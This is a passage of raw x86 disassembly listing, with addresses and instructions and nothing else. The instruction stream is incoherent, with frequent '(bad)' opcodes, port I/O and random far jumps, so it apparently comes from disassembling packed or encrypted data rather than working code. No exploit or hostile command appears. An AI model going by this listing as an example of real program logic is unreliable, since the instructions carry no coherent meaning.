  419124:	lods   al,BYTE PTR ds:[esi]
  419125:	pop    ecx
  419126:	and    al,0xf2
  419128:	loope  0x4190bd
  41912a:	stos   BYTE PTR es:[edi],al
  41912b:	pusha  
  41912c:	popf   
  41912d:	xor    DWORD PTR [ebp+0x43],esi
  419130:	xchg   esi,eax
  419131:	in     eax,0x45
  419133:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419134:	mov    bh,0x22
  419136:	push   esp
  419137:	rcr    DWORD PTR [ecx-0x63],1
  41913a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41913b:	test   BYTE PTR [ebx-0x30],bl
  41913e:	clc    
  41913f:	call   0x39c6:0x166d93bd
  419146:	pusha  
  419147:	jle    0x419100
  419149:	add    BYTE PTR [ebp-0x4a],bh
  41914c:	mov    ds:0x8ef97680,al
  419151:	pushf  
  419152:	add    DWORD PTR ds:0xddfef315,edi
  419158:	nop
  419159:	int3   
  41915a:	test   eax,0x475e6b83
  41915f:	cld    
  419160:	jmp    0xc3a3aa7f
  419165:	mov    esp,0x5801f750
  41916a:	mov    ecx,0x98965a53
  41916f:	sbb    eax,0x46dffb72
  419174:	imul   edi,DWORD PTR [ebp+0x48],0xffffff9c
  419178:	jne    0x4191d1
  41917a:	jl     0x41917c
  41917c:	cmp    DWORD PTR [eax+0x41],esp
  41917f:	push   ebp
  419180:	add    BYTE PTR [edx],dl
  419182:	call   0xd315:0x7da30f4d
  419189:	jae    0x41914b
  41918b:	test   DWORD PTR [edi-0x1d],0x7c9b7c0e
  419192:	mov    eax,ds:0x92eec24a
  419197:	and    ah,BYTE PTR [edi]
  419199:	rcr    BYTE PTR [ecx+0x1abd5462],cl
  41919f:	sar    ah,1
  4191a1:	in     al,0x17
  4191a3:	dec    ecx
  4191a4:	mov    dh,0xaa
  4191a6:	or     ebx,ebp
  4191a8:	inc    edi
  4191a9:	xchg   ebx,eax
  4191aa:	pop    eax
  4191ab:	test   eax,esp
  4191ad:	mov    dh,0xd2
  4191af:	adc    ecx,edx
  4191b1:	adc    al,0xed
  4191b3:	les    edi,FWORD PTR [eax]
  4191b5:	cli    
  4191b6:	mov    ah,0x4f
  4191b8:	ss js  0x41920d
  4191bb:	push   ds
  4191bc:	icebp  
  4191bd:	xchg   esi,eax
  4191be:	out    0xad,al
  4191c0:	mov    al,ds:0x4633a95a
  4191c5:	icebp  
  4191c6:	xor    eax,0x84cf0a79
  4191cb:	or     BYTE PTR [esi+0x58],bl
  4191ce:	int    0x71
  4191d0:	repnz mov esp,0x44356bf
  4191d6:	xor    ecx,esp
  4191d8:	shr    ecx,cl
  4191da:	add    eax,0x4c2a467d
  4191df:	pop    ss
  4191e0:	out    dx,eax
  4191e1:	retf   
  4191e2:	mov    eax,ds:0x290c083a
  4191e7:	loope  0x4191fc
  4191e9:	lods   al,BYTE PTR ds:[esi]
  4191ea:	jb     0x419267
  4191ec:	inc    ecx
  4191ed:	adc    edx,DWORD PTR [eax-0x4c]
  4191f0:	and    eax,0x79421be5
  4191f5:	mov    dh,0x69
  4191f7:	adc    DWORD PTR [eax+0x20825585],ecx
  4191fd:	out    dx,al
  4191fe:	retf   0xda2e
  419201:	and    bl,BYTE PTR [ecx-0x63]
  419204:	jo     0x4191c3
  419206:	(bad)  
  419207:	push   ds
  419208:	je     0x41921f
  41920a:	dec    edx
  41920b:	stc    
  41920c:	aam    0x5a
  41920e:	xlat   BYTE PTR ds:[ebx]
  41920f:	jge    0x41925c
  419211:	mov    al,bh
  419213:	stc    
  419214:	int3   
  419215:	jg     0x419295
  419217:	sbb    dl,BYTE PTR ds:0x24e0fd80
  41921d:	xor    eax,DWORD PTR [edx-0x15]
  419220:	inc    ebp
  419221:	sub    esi,DWORD PTR ds:0xbc1c119d
  419227:	cld    
  419228:	in     al,0xf1
  41922a:	push   eax
  41922b:	das    
  41922c:	jecxz  0x4192a2
  41922e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41922f:	jbe    0x4191f9
  419231:	push   esi
  419232:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419233:	cmp    DWORD PTR [edi+0x12],ebx
  419236:	stc    
  419237:	scas   al,BYTE PTR es:[edi]
  419238:	ja     0x4191d8
  41923a:	mov    ch,0xc4
  41923c:	or     eax,0x96a3545d
  419241:	leave  
  419242:	int3   
  419243:	inc    edx
  419244:	int3   
  419245:	cmc    
  419246:	fistp  DWORD PTR [eax]
  419248:	out    dx,eax
  419249:	dec    ebx
  41924a:	lods   eax,DWORD PTR ds:[esi]
  41924b:	dec    edi
  41924c:	je     0x41929e
  41924e:	mov    al,ds:0x5d40f816
  419253:	shl    BYTE PTR [eax+0x3b212269],cl
  419259:	cld    
  41925a:	mov    eax,ds:0x451657e5
  41925f:	mov    eax,0xc094ac69
  419264:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419265:	xchg   ebp,eax
  419266:	pop    eax
  419267:	mov    ebp,0x5ca24aa8
  41926c:	adc    bl,BYTE PTR [esi+0x4fae8d91]
  419272:	xor    bh,BYTE PTR [ecx+esi*4]
  419275:	mov    edx,ecx
  419277:	adc    DWORD PTR [ebx+0x6859acff],ebx
  41927d:	jmp    0x854c:0x8a51203c
  419284:	add    edx,DWORD PTR [edx+0x25]
  419287:	mov    bl,0x9a
  419289:	adc    eax,0xbb578c7e
  41928e:	sub    BYTE PTR [ecx+0x25bc82ae],dh
  419294:	sti    
  419295:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419296:	jle    0x4192df
  419298:	lock std 
  41929a:	mov    ch,0xbc
  41929c:	xor    al,0x2
  41929e:	popa   
  41929f:	daa    
  4192a0:	push   0x56d2be9a
  4192a5:	lea    edi,[ebx]
  4192a7:	in     al,0x62
  4192a9:	mov    fs,edi
  4192ab:	dec    edi
  4192ac:	cmc    
  4192ad:	clc    
  4192ae:	addr16 aad 0xc9
  4192b1:	xchg   ebx,eax
  4192b2:	stc    
  4192b3:	into   
  4192b4:	jne    0x419296
  4192b6:	and    DWORD PTR [edx+0x7c],0x82b6ee4a
  4192bd:	scas   al,BYTE PTR es:[edi]
  4192be:	hlt    
  4192bf:	idiv   BYTE PTR [ebx]
  4192c1:	mov    bl,0xd4
  4192c3:	jge    0x419324
  4192c5:	cmp    al,0x1
  4192c7:	mov    dh,0x6d
  4192c9:	dec    esp
  4192ca:	pop    esi
  4192cb:	xlat   BYTE PTR ds:[ebx]
  4192cc:	sbb    BYTE PTR [esi-0x55],0xea
  4192d0:	mov    ds:0xde8ebfba,eax
  4192d5:	arpl   WORD PTR [eax+0x4dd4d467],bp
  4192db:	sub    DWORD PTR [ebx-0x7b5f9089],edx
  4192e1:	out    dx,eax
  4192e2:	retf   
  4192e3:	dec    ebp
  4192e4:	lahf   
  4192e5:	pop    ds
  4192e6:	push   esi
  4192e7:	push   esi
  4192e8:	out    dx,eax
  4192e9:	icebp  
  4192ea:	addr16 aad 0x81
  4192ed:	sub    DWORD PTR [edx+ebp*4],eax
  4192f0:	call   0xf63d:0x410e5b25
  4192f7:	imul   ah
  4192f9:	inc    esi
  4192fa:	or     ebx,eax
  4192fc:	outs   dx,BYTE PTR ds:[esi]
  4192fd:	frstpm(287 only) 
  4192ff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419300:	ffreep st(0)
  419302:	mov    esp,0xec0967f4
  419307:	cli    
  419308:	int    0x5d
  41930a:	xchg   edi,eax
  41930b:	ja     0x419311
  41930d:	fild   WORD PTR [ecx]
  41930f:	pop    ebx
  419310:	add    al,0x39
  419312:	fs in  al,0x51
  419315:	inc    esp
  419317:	jb     0x4192e4
  419319:	sub    ch,0x75
  41931c:	and    ebx,DWORD PTR [ecx+0x59]
  41931f:	sbb    eax,0x6f3cd405
  419324:	or     edi,DWORD PTR [ebx+0x4]
  419327:	jmp    0x13e7:0x44ae724a
  41932e:	cmp    ch,0x35
  419331:	ins    DWORD PTR es:[edi],dx
  419332:	inc    ecx
  419333:	xchg   ecx,eax
  419334:	dec    ecx
  419335:	addr16 cdq 
  419337:	lahf   
  419338:	add    eax,0xac29fe63
  41933d:	mov    ecx,0x79bd15a6
  419342:	sti    
  419343:	pop    eax
  419344:	or     al,0xc5
  419346:	fist   DWORD PTR [ebx+0x12]
  419349:	sahf   
  41934a:	or     DWORD PTR [esi+0x180b16eb],esi
  419350:	shl    bl,0x6c
  419353:	pop    edx
  419354:	or     esp,esi
  419356:	cmp    DWORD PTR [edi+0x2487b944],0x27
  41935d:	adc    eax,0xf53f01a1
  419362:	fsubr  QWORD PTR [edi-0x36]
  419365:	gs sub al,0x1f
  419368:	stos   BYTE PTR es:[edi],al
  419369:	fldcw  WORD PTR [eax]
  41936b:	dec    ebp
  41936c:	jg     0x41937b
  41936e:	sbb    DWORD PTR [esi+0x23a4ebdf],esp
  419374:	sub    ch,BYTE PTR [edx]
  419376:	and    cl,BYTE PTR [ecx+0x5de52c1]
  41937c:	mov    ebx,0x57641d27
  419381:	dec    edx
  419382:	fidiv  DWORD PTR [ebp+0x34]
  419385:	jnp    0x419361
  419387:	mov    al,0xdb
  419389:	jb     0x41939f
  41938b:	add    al,0xa6
  41938d:	pop    ebp
  41938e:	push   0x22
  419390:	xchg   ecx,eax
  419391:	test   al,0xc
  419393:	ret    
  419394:	jb     0x41938a
  419396:	jp     0x41937d
  419398:	and    eax,0x57d4ce86
  41939d:	daa    
  41939e:	test   eax,0x39aab076
  4193a3:	sti    
  4193a4:	add    BYTE PTR [ebx+0x5d],bh
  4193a7:	rol    BYTE PTR [esi+0x4d38ef5],cl
  4193ad:	dec    ebp
  4193ae:	or     al,0x4d
  4193b0:	mov    ds:0x60ae330f,eax
  4193b5:	jo     0x4193ef
  4193b7:	(bad)  
  4193b9:	inc    edx
  4193ba:	jp     0x4193fc
  4193bc:	pop    es
  4193bd:	mov    esi,0xce7f26
  4193c2:	in     eax,0x78
  4193c4:	push   es
  4193c5:	stos   BYTE PTR es:[edi],al
  4193c6:	fwait
  4193c7:	jecxz  0x419387
  4193c9:	jmp    0x973a:0x386717c7
  4193d0:	icebp  
  4193d1:	in     al,0xe4
  4193d3:	inc    esi
  4193d4:	sub    BYTE PTR ds:0x5ad57442,al
  4193da:	aad    0x79
  4193dc:	inc    edi
  4193dd:	mov    cl,0xd8
  4193df:	jl     0x41937a
  4193e1:	imul   ecx,DWORD PTR [edx],0xffffffaf
  4193e4:	mov    es,ebx
  4193e6:	push   ecx
  4193e7:	ret    0x3cb
  4193ea:	inc    esp
  4193eb:	bound  esi,QWORD PTR [esi+0x79]
  4193ee:	bound  esp,QWORD PTR [ebx]
  4193f0:	add    DWORD PTR ds:0xaaae2fed,0xab244e7
  4193fa:	fistp  WORD PTR [edx]
  4193fc:	int3   
  4193fd:	xchg   esi,eax
  4193fe:	cmp    eax,0x3e9c3b8e
  419403:	jne    0x4193b0
  419405:	mov    ch,0x69
  419407:	gs aam 0xf6
  41940a:	fst    QWORD PTR [edi+edi*8+0x2f]
  41940e:	test   eax,ebx
  419410:	not    BYTE PTR [esi]
  419412:	test   BYTE PTR [eax+0xc1409e4],cl
  419418:	inc    edx
  419419:	nop
  41941a:	test   eax,0xa0d58d12
  41941f:	inc    esp
  419420:	mov    ds:0xaf1c79f0,eax
  419425:	div    BYTE PTR [eax+0x26]
  419428:	scas   eax,DWORD PTR es:[edi]
  419429:	or     al,0xe4
  41942b:	xlat   BYTE PTR ds:[ebx]
  41942c:	cs push 0xffffffaf
  41942f:	inc    esi
  419430:	push   ds
  419431:	xor    DWORD PTR [ecx+0x19],ebx
  419434:	lods   eax,DWORD PTR ds:[esi]
  419435:	daa    
  419436:	(bad)  
  419437:	cmp    BYTE PTR [edx-0x2],dh
  41943a:	into   
  41943b:	add    edx,0xfffffffa
  41943e:	loopne 0x4193fa
  419440:	clc    
  419441:	mov    eax,ds:0x2cb786fe
  419446:	or     DWORD PTR [ebx+0x7144d29e],edx
  41944c:	pop    eax
  41944d:	xor    BYTE PTR [ecx+ebx*1-0x1d],ch
  419451:	(bad)  
  419452:	jmp    0x5e7b:0x3b0a1ac0
  419459:	xcrypt-ecb (bad)
  41945a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41945b:	or     al,0xef
  41945d:	mov    ebp,0xb751cb9b
  419462:	lock fmulp st(6),st
  419465:	inc    esi
  419466:	inc    esi
  419467:	stos   BYTE PTR es:[edi],al
  419468:	int    0x0
  41946a:	loope  0x419474
  41946c:	icebp  
  41946d:	retf   
  41946e:	fs mov esi,0xd6bfeaf3
  419474:	(bad)  
  419475:	cli    
  419476:	retf   
  419477:	sbb    DWORD PTR [esi-0x217a1e28],0xcf591346
  419481:	push   es
  419482:	dec    ebx
  419483:	(bad)  
  419484:	mov    BYTE PTR [edx+0x39],0xbe
  419488:	std    
  419489:	and    al,0x41
  41948b:	pop    esi
  41948c:	and    al,BYTE PTR [ebx]
  41948e:	jnp    0x419442
  419490:	adc    BYTE PTR [edx],cl
  419492:	in     eax,0x85
  419494:	lds    esi,FWORD PTR [esi-0x3bd77c11]
  41949a:	cmp    esi,esp
  41949c:	jmp    0x45a17111
  4194a1:	push   ebp
  4194a2:	pop    ecx
  4194a3:	add    BYTE PTR [ecx],al
  4194a5:	inc    ebp
  4194a6:	loope  0x4194ec
  4194a8:	lahf   
  4194a9:	inc    eax
  4194aa:	and    eax,0x23e967b8
  4194af:	popf   
  4194b0:	mov    eax,ds:0xf5eed995
  4194b5:	jb     0x4194b4
  4194b7:	in     eax,dx
  4194b8:	addr16 fwait
  4194ba:	lahf   
  4194bb:	jmp    0xf3c08396
  4194c0:	jmp    edx
  4194c2:	add    eax,0x292b0a30
  4194c7:	test   al,0x36
  4194c9:	jbe    0x419526
  4194cb:	sbb    al,BYTE PTR [edi+ecx*4-0x7c792273]
  4194d2:	and    DWORD PTR [edx],ebp
  4194d4:	cmp    cl,BYTE PTR [ecx+0x53b4e1d9]
  4194da:	push   eax
  4194db:	xchg   esp,eax
  4194dc:	into   
  4194dd:	sbb    DWORD PTR [ecx-0x40bedb47],ebp
  4194e3:	repz pop edx
  4194e5:	sbb    edi,ebp
  4194e7:	xlat   BYTE PTR ds:[ebx]
  4194e8:	jne    0x419539
  4194ea:	neg    BYTE PTR [ebp-0x9385bc5]
  4194f0:	jae    0x419506
  4194f2:	xor    eax,0x8d7385e0
  4194f7:	add    ecx,edx
  4194f9:	sub    BYTE PTR [ebx-0x4baf9e84],bh
  4194ff:	cmp    al,0x27
  419501:	std    
  419502:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419503:	mov    ebx,0x11450e45
  419508:	inc    ebp
  419509:	aad    0x50
  41950b:	jmp    0x318acabb
  419510:	sbb    eax,0x909ee12d
  419515:	dec    eax
  419516:	das    
  419517:	mov    cs,WORD PTR [ebp+0x27]
  41951a:	out    dx,al
  41951b:	ficom  DWORD PTR [esi-0x1b445dab]
  419521:	sub    eax,0x1f81cc81
  419526:	add    BYTE PTR [edi+ebp*1+0x77],0x34
  41952b:	das    
  41952c:	aaa    
  41952d:	xor    ah,ch
  41952f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419530:	inc    esi
  419531:	mov    dh,0xef
  419533:	dec    edi
  419534:	push   cs
  419535:	cmp    bh,BYTE PTR [edi]
  419537:	adc    DWORD PTR [ebp+0x7b],edi
  41953a:	add    eax,0x1e76e709
  41953f:	lahf   
  419540:	jns    0x41957e
  419542:	push   esp
  419543:	mov    edx,0x43d81c01
  419548:	ret    
  419549:	sbb    BYTE PTR [edi],0x1d
  41954c:	mov    esi,0x6a902e96
  419551:	dec    ecx
  419552:	jbe    0x41955e
  419554:	xor    BYTE PTR [eax-0x64],dh
  419557:	lea    edx,[edx+0x723aa6ef]
  41955d:	mov    dl,0x61
  41955f:	sbb    eax,0x1b7041a4
  419564:	push   0xffffffba
  419566:	out    0x89,al
  419568:	xor    DWORD PTR [esi],ebx
  41956a:	xchg   edi,eax
  41956b:	test   al,0xef
  41956d:	pop    esi
  41956e:	js     0x41959e
  419570:	xor    cl,ah
  419572:	bsr    edi,esp
  419575:	xchg   esp,eax
  419576:	cmc    
  419577:	jmp    0xd6ea35ec
  41957c:	xchg   ebx,ebx
  41957e:	sub    al,0x81
  419580:	jg     0x4195a8
  419582:	jmp    0x1432:0x66ec1633
  419589:	xor    ebp,ebx
  41958b:	mov    ds:0xee59aca,al
  419590:	int    0x3a
  419592:	in     al,dx
  419593:	into   
  419594:	rol    BYTE PTR [ebx],0x55
  419597:	arpl   WORD PTR [ebp+0x3d],cx
  41959a:	repz push eax
  41959c:	and    eax,0xf2a18e1d
  4195a1:	(bad)  
  4195a2:	lock or al,0x7b
  4195a5:	leave  
  4195a6:	or     eax,0xe6bc305f
  4195ab:	xor    eax,0xfeade56f
  4195b0:	scas   al,BYTE PTR es:[edi]
  4195b1:	clc    
  4195b2:	sbb    eax,0xe29cfb47
  4195b7:	fdiv   DWORD PTR [esi-0x18]
  4195ba:	sbb    DWORD PTR [ebp-0xa0e4665],edx
  4195c0:	push   edi
  4195c1:	cmp    BYTE PTR [ebx],0x44
  4195c4:	or     eax,0xe8ffb64a
  4195c9:	or     al,0x8b
  4195cb:	jmp    0xea0c:0x15ac6678
  4195d2:	dec    ebp
  4195d3:	mov    ax,fs:0x18bd33bd
  4195da:	(bad)  
  4195db:	pop    ebx
  4195dc:	push   ds
  4195dd:	lahf   
  4195de:	je     0x4195a9
  4195e0:	pop    esp
  4195e1:	stos   DWORD PTR es:[edi],eax
  4195e2:	retf   
  4195e3:	ins    BYTE PTR es:[edi],dx
  4195e4:	fsub   QWORD PTR ds:0x21d6b9d8
  4195ea:	outs   dx,BYTE PTR ds:[esi]
  4195eb:	fldcw  WORD PTR es:[edx-0x733af8b0]
  4195f2:	retf   
  4195f3:	mov    dh,0x23
  4195f5:	mov    eax,0x8428dbf3
  4195fa:	(bad)  [ecx+0x67695fd]
  419600:	mov    dl,0x10
  419602:	pop    ebp
  419603:	mov    ds:0xb88a0538,eax
  419608:	out    dx,eax
  419609:	es mov ss,eax
  41960c:	pop    eax
  41960d:	or     al,0x54
  41960f:	cmp    DWORD PTR [ebx-0x77],ecx
  419612:	jl     0x4195c2
  419614:	mov    bl,0xec
  419616:	or     dh,bh
  419618:	mov    ds:0xdca2c953,eax
  41961e:	fisubr WORD PTR [eax-0x1bdc8cd8]
  419624:	inc    ecx
  419625:	push   ecx
  419626:	adc    BYTE PTR [ecx],dl
  419628:	cmp    eax,0x82bdd805
  41962d:	ret    
  41962e:	mov    edx,0xc788aa15
  419633:	jecxz  0x419696
  419635:	xor    cl,BYTE PTR [edi-0x68]
  419638:	or     al,0x8
  41963a:	add    eax,0xbb44db59
  41963f:	sbb    esi,DWORD PTR [ecx+0x3a]
  419642:	sti    
  419643:	push   edi
  419644:	lods   eax,DWORD PTR ds:[esi]
  419645:	and    dh,BYTE PTR ds:0xf3e0ed4c
  41964b:	out    0xee,al
  41964d:	enter  0x70f,0x2c
  419651:	xchg   BYTE PTR [ebp-0x35d7f1df],ch
  419657:	addr16 inc edx
  419659:	jg     0x419644
  41965b:	out    dx,eax
  41965c:	fimul  WORD PTR [esi-0x7c]
  41965f:	stos   BYTE PTR es:[edi],al
  419660:	shr    DWORD PTR [eax-0x74b9908b],0x68
  419667:	inc    ecx
  419668:	inc    edx
  419669:	stos   BYTE PTR es:[edi],al
  41966a:	sub    ah,BYTE PTR [esi]
  41966c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41966d:	loop   0x4196e4
  41966f:	mov    ah,0x3a
  419671:	xchg   ebp,esi
  419673:	pop    ss
  419674:	push   ss
  419675:	jp     0x419699
  419677:	sub    eax,0x2070d6e1
  41967c:	imul   esi,DWORD PTR [ecx+ebp*4],0xffffffc3
  419680:	xchg   BYTE PTR [esi],ah
  419682:	mov    ?,WORD PTR ds:0xe1193044
  419688:	cwde   
  419689:	cmc    
  41968a:	push   0xffffffa0
  41968c:	xchg   esp,eax
  41968d:	mov    bl,0xfe
  41968f:	dec    eax
  419690:	std    
  419691:	out    dx,eax
  419692:	dec    ebp
  419693:	mul    BYTE PTR [edi]
  419695:	or     bl,al
  419697:	jmp    0x1cef:0xb95e54a4
  41969e:	add    DWORD PTR [edi-0x2a],esp
  4196a1:	pop    es
  4196a2:	je     0x4196ac
  4196a4:	sub    BYTE PTR [ebx+0x25c3ce4e],ah
  4196aa:	fidiv  DWORD PTR [ecx+edi*8]
  4196ad:	repz fs and al,0xfe
  4196b1:	cmp    DWORD PTR [esi+0x19],0x69c925d4
  4196b8:	xchg   ebx,eax
  4196b9:	icebp  
  4196ba:	je     0x4196b2
  4196bc:	and    bh,BYTE PTR [esi]
  4196be:	jne    0x419707
  4196c0:	dec    ebx
  4196c1:	mov    esi,0xcf9af0de
  4196c6:	push   eax
  4196c7:	repnz stos BYTE PTR es:[edi],al
  4196c9:	stos   DWORD PTR es:[edi],eax
  4196ca:	pop    ecx
  4196cb:	into   
  4196cc:	mov    ds:0x8de1949f,al
  4196d1:	pop    edx
  4196d2:	(bad)  
  4196d4:	cmp    eax,0xbbb6d778
  4196d9:	xchg   DWORD PTR ds:0xb153cf43,ebp
  4196df:	aad    0x4a
  4196e1:	in     al,dx
  4196e2:	add    al,0x6f
  4196e4:	pop    eax
  4196e5:	mov    BYTE PTR [eax-0x43ae8726],0x4a
  4196ec:	sahf   
  4196ed:	sbb    DWORD PTR [esi+0x72],edx
  4196f0:	push   esp
  4196f1:	loope  0x4196bc
  4196f3:	int    0xce
  4196f5:	dec    ecx
  4196f6:	pop    ecx
  4196f7:	fst    QWORD PTR [ecx+eiz*4+0x6a]
  4196fb:	adc    DWORD PTR [edi],esi
  4196fd:	das    
  4196fe:	jl     0x4196ce
  419700:	mov    ecx,0x4a473ffa
  419705:	and    DWORD PTR [eax],esi
  419707:	pusha  
  419708:	pop    ebp
  419709:	(bad)  
  41970a:	mov    esi,0xe3dc4b29
  41970f:	aad    0x1d
  419711:	cli    
  419712:	retf   
  419713:	xor    al,0xa4
  419715:	cdq    
  419716:	into   
  419717:	icebp  
  419718:	(bad)  
  419719:	cmp    DWORD PTR [edx],0xffffffad
  41971c:	aaa    
  41971d:	ss std 
  41971f:	jecxz  0x4196c6
  419721:	adc    esp,0xffffffcb
  419724:	jnp    0x41978a
  419726:	cmp    DWORD PTR [eax-0x6e],ecx
  419729:	xor    al,0xf6
  41972b:	rol    bx,1
  41972e:	mov    BYTE PTR [edi],bh
  419730:	xchg   ebp,eax
  419731:	out    0x26,al
  419733:	mov    eax,ds:0x6e59ef08
  419738:	test   eax,0x5ab54f8e
  41973d:	icebp  
  41973e:	inc    ebx
  41973f:	frndint 
  419741:	cmp    esi,ebp
  419743:	sub    eax,0xd412a297
  419748:	shl    BYTE PTR [ebx-0x2aa37019],0xd9
  41974f:	mov    es,WORD PTR [edx-0x6c]
  419752:	pop    ebp
  419753:	lahf   
  419754:	dec    edx
  419755:	hlt    
  419756:	sbb    eax,0x73c869f0
  41975b:	je     0x4196e9
  41975d:	in     al,dx
  41975e:	push   ebp
  41975f:	dec    esp
  419760:	outs   dx,BYTE PTR ds:[esi]
  419761:	adc    eax,0x8bb44740
  419766:	outs   dx,BYTE PTR ds:[esi]
  419767:	outs   dx,BYTE PTR ds:[esi]
  419768:	inc    ecx
  419769:	and    al,0xeb
  41976b:	retf   
  41976c:	mov    ecx,0x7c230f95
  419771:	pop    esp
  419772:	jmp    0x4197bb
  419774:	inc    ecx
  419775:	stos   BYTE PTR es:[edi],al
  419776:	jo     0x41973d
  419778:	jae    0x419790
  41977a:	outs   dx,BYTE PTR ds:[esi]
  41977b:	pusha  
  41977c:	cwde   
  41977d:	mov    DWORD PTR [edi-0x226c7ac6],ecx
  419783:	sub    cl,BYTE PTR [ebx-0x5b7e3c9b]
  419789:	adc    al,0x55
  41978b:	mov    dl,0xfd
  41978d:	addr16 mov cl,0xab
  419790:	hlt    
  419791:	cs scas al,BYTE PTR es:[edi]
  419793:	mov    ah,0x81
  419795:	xlat   BYTE PTR ds:[ebx]
  419796:	call   0xe42722ab
  41979b:	test   DWORD PTR [ecx+0x4a],0x60160819
  4197a2:	pushf  
  4197a3:	ja     0x419810
  4197a5:	or     al,0xd3
  4197a7:	cdq    
  4197a8:	repz call 0x454:0xe838e2f0
  4197b0:	push   0xffffffc5
  4197b2:	mov    BYTE PTR [ecx],al
  4197b4:	stc    
  4197b5:	push   0x21
  4197b7:	xadd   DWORD PTR [esi+0x1b],esi
  4197bb:	shl    BYTE PTR [edi+0x582755c5],cl
  4197c1:	mov    ch,0x48
  4197c3:	ja     0x419801
  4197c5:	in     eax,0xa2
  4197c7:	xchg   esi,eax
  4197c8:	jbe    0x4197c3
  4197ca:	push   ss
  4197cb:	lea    ecx,[ebx+0x4d7c5ffc]
  4197d1:	or     DWORD PTR [esi],edx
  4197d3:	(bad)  
  4197d4:	jno    0x4197c2
  4197d6:	xor    DWORD PTR [ebp+0x2a4d972e],0xb
  4197dd:	inc    ebp
  4197de:	jl     0x419821
  4197e0:	or     BYTE PTR ds:0x40685151,0xb0
  4197e7:	push   esp
  4197e8:	mov    eax,esi
  4197ea:	addr16 ret 
  4197ec:	mov    ch,0xb7
  4197ee:	pop    ecx
  4197ef:	mov    esp,0x89b81d16
  4197f4:	js     0x4197a0
  4197f6:	shl    dh,0x8c
  4197f9:	sbb    eax,0x83db2d5
  4197fe:	and    edi,edx
  419800:	retf   0xc826
  419803:	sahf   
  419804:	div    BYTE PTR [edi-0x2adb385a]
  41980a:	xchg   ebx,eax
  41980b:	sar    DWORD PTR [esi+edx*8+0xd512b48],0xfa
  419813:	jae    0x4197c9
  419815:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419816:	out    0xa,eax
  419818:	push   0x68dda8c
  41981d:	(bad)  
  41981f:	(bad)  
  419820:	jo     0x419858
  419822:	dec    esi
  419823:	clc    
  419824:	mov    al,0x7b
  419826:	or     DWORD PTR [ebx],ecx
  419828:	adc    al,0x5
  41982a:	add    eax,ebx
  41982c:	sbb    DWORD PTR [ecx-0x6a764827],ebx
  419832:	push   edi
  419833:	out    dx,eax
  419834:	pop    ecx
  419835:	xor    dh,BYTE PTR [eax+0x12]
  419838:	pop    esi
  419839:	jnp    0x419809
  41983b:	(bad)  
  41983c:	and    BYTE PTR [ebx+0x3b],ch
  41983f:	mov    ecx,0xc6e95c85
  419844:	retf   0xfe62
  419847:	hlt    
  419848:	inc    ecx
  419849:	adc    DWORD PTR [edi-0x25],esp
  41984c:	xor    DWORD PTR [esp+esi*2],0x4
  419850:	jg     0x4197e9
  419852:	cs xchg ecx,eax
  419854:	scas   al,BYTE PTR es:[edi]
  419855:	(bad)  
  419856:	xlat   BYTE PTR ds:[ebx]
  419857:	arpl   WORD PTR [eax+0x78051edf],sp
  41985d:	mov    eax,0xf8dd161c
  419862:	jle    0x4197f4
  419864:	or     ch,BYTE PTR [edx+0x4ac51a10]
  41986a:	sbb    ch,ch
  41986c:	xor    al,0x4b
  41986e:	add    al,0x79
  419870:	or     ebx,DWORD PTR [ecx]
  419872:	das    
  419873:	das    
  419874:	cld    
  419875:	mov    ecx,0x66b5772e
  41987a:	popa   
  41987b:	or     DWORD PTR [edx],esi
  41987d:	sub    bh,BYTE PTR [edx+0x76]
  419880:	add    DWORD PTR [eax-0x44],0xffffffa2
  419884:	mov    WORD PTR [esi],fs
  419886:	or     edi,DWORD PTR [edi+0x2]
  419889:	lea    esi,fs:[edi+0x5e8f3ea4]
  419890:	(bad)  
  419892:	daa    
  419893:	cli    
  419894:	hlt    
  419895:	retf   0x97dd
  419898:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419899:	dec    ebx
  41989a:	cld    
  41989b:	dec    DWORD PTR [esp+eax*4-0x6c2ef728]
  4198a2:	jno    0x4198a2
  4198a4:	mov    dl,0x70
  4198a6:	loopne 0x4198ff
  4198a8:	cmp    eax,0xa7b23f2b
  4198ad:	dec    ebx
  4198ae:	mov    al,0x5d
  4198b0:	in     al,dx
  4198b1:	lahf   
  4198b2:	xchg   ecx,eax
  4198b3:	fldln2 
  4198b5:	jnp    0x419904
  4198b7:	xchg   ebx,eax
  4198b8:	fadd   QWORD PTR [ebx-0x5c8bd7dd]
  4198be:	or     DWORD PTR [eax+0x5c],eax
  4198c1:	ja     0x419859
  4198c3:	(bad)  
  4198c4:	lods   al,BYTE PTR ds:[esi]
  4198c5:	dec    esi
  4198c6:	push   edx
  4198c7:	dec    ebp
  4198c8:	jmp    0x1fa2ae0b
  4198cd:	enter  0x2661,0x76
  4198d1:	iret   
  4198d2:	add    DWORD PTR [esi],ebp
  4198d4:	dec    ecx
  4198d5:	xchg   dh,ch
  4198d7:	ins    BYTE PTR es:[edi],dx
  4198d8:	mov    eax,ds:0xcd64673
  4198dd:	dec    esp
  4198de:	iret   
  4198df:	ds push 0xffffffc3
  4198e2:	mov    bl,BYTE PTR ds:0x43a2a734
  4198e8:	xchg   ebx,eax
  4198e9:	cmp    BYTE PTR [edi],dl
  4198eb:	dec    esp
  4198ec:	push   edx
  4198ed:	cmp    ebp,ebx
  4198ef:	push   ebp
  4198f0:	ds cmp eax,0x54f31b47
  4198f6:	inc    ebx
  4198f7:	dec    esp
  4198f8:	out    dx,al
  4198f9:	mov    ss,WORD PTR [ecx]
  4198fb:	jmp    0x591f:0x8ba7cca0
  419902:	lods   al,BYTE PTR ds:[esi]
  419903:	xor    ah,0x34
  419906:	in     al,dx
  419907:	(bad)  
  419908:	rcl    cl,cl
  41990a:	mov    esp,DWORD PTR [edi+eiz*4-0x53]
  41990e:	aam    0xa8
  419910:	pop    ss
